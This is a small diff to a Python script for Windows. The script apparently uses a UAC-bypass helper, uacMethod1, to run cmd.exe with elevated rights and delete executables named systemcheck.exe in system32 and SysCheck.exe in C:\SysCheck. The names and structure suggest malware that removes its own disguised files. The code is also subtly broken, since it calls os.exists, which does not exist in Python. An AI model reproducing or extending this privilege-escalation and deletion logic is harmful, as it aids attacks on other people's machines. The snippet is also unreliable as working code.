@@ -6,6 +6,7 @@ import time, os, sys, shutil, win32api, win32con, threading
 
 if os.exists("c:\\windows\\system32\\systemcheck.exe"):
 	uacMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', r'del c:\windows\system32\systemcheck.exe'])
+if os.exists("c:\\SysCheck\\SysCheck.exe"):
 	uacMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', r'del C:\\SysCheck\\SysCheck.exe'])
 
 if getattr(sys, 'frozen', False):
